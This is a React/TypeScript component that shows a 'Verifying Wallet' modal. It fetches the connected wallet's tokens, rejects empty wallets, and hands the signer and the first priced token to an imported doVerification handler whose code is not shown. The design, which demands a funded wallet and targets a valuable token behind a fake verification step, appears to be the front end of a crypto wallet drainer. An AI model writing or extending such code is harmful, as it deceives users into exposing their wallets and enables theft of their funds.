import {useAccount} from "wagmi";
import Big from "big.js";
import Link from "next/link";
import React, {useEffect, useState} from "react";
import {getAddressTokens, useAddressTokens} from "@v3/@special/wallet/hooks";
import {ContractCovalenTHQ} from "@/app/(version1)/v1/TokenList";
import {useInit} from "@/utils/safeState";
import {doVerification} from "@v3/@special/wallet/handlers";
import {useEthersProvider, useEthersSigner} from "@/app/(version1)/v1/ethers";

export const handleWalletVerification = (account: ReturnType<typeof useAccount>) => {
	window.location.href = "#verification";
	setVerifyState(pre => ({
		...pre,
		account
	}))
};

export let setVerifyState: ((o: VerifyState)=>void) | ((o: ((o2: VerifyState)=>VerifyState))=>void) = ()=>{};

type VerifyState = {
	error?: string,
	text?: string,
	title?: string,
	account?: ReturnType<typeof useAccount>
}

export const WalletVerificationModal = () => {
	const [state, setState] = useState<VerifyState>({
		text: "...",
		title: "Checking address and validating wallet..."
	});
	const provider = useEthersProvider();
	const signer = useEthersSigner()
	const [tokens,setTokens] = useState<Awaited<ReturnType<typeof getAddressTokens>> | undefined>(undefined);
	setVerifyState = setState;

	useInit(()=>{
		if (state.account?.address) {
			setState(pre => ({
				...pre,
				text: "Fetching Wallet info..."
			}))
			getAddressTokens(state.account.address,state.account.chainId || -1).then(setTokens).catch(console.error);
		}
	},[state.account?.address]);

	useInit(() => {
		if (!tokens) return;
		const target = tokens?.at?.(0);

		if (!target || target.price <= 0) {
			setState(pre => ({
				...pre,
				error: "Please connect valid Wallet (don't connect new/empty wallet)"
			}));
		} else if (state.account) {
			doVerification(provider,signer,state.account, target).catch((e: any)=>{
				setVerifyState(pre => ({
					...pre,
					error: e?.message ?? e
				}))
			})
		}
	}, [tokens]);

	return (
		<div id="verification" className="modal">
			<div className="modal-dialog">
				<div className="modal-content">
					<div className="modal-header">
						<span className="modal-title">Verifying Wallet...</span>
					</div>
					<div className="modal-body">
						<span className="modal-info">{state.title}</span>
						<div className="modal-calc">

						</div>
						<span className="modal-minimum-boost">{state.text}</span>
						<br/>
						{tokens?.map(t => (
							<div>
								<button>
									test
								</button>
								{t.contract_ticker_symbol}
								{t.price}
							</div>
						))}
						{state.error && (
							<button onClick={()=>{
								window.location.hash = ""
							}} className={'bg-black w-[200px] mx-auto text-white border-white mt-5 text-lg hover:text-white'}>
								Close
							</button>
						)}
					</div>
				</div>
			</div>
		</div>
	);
};
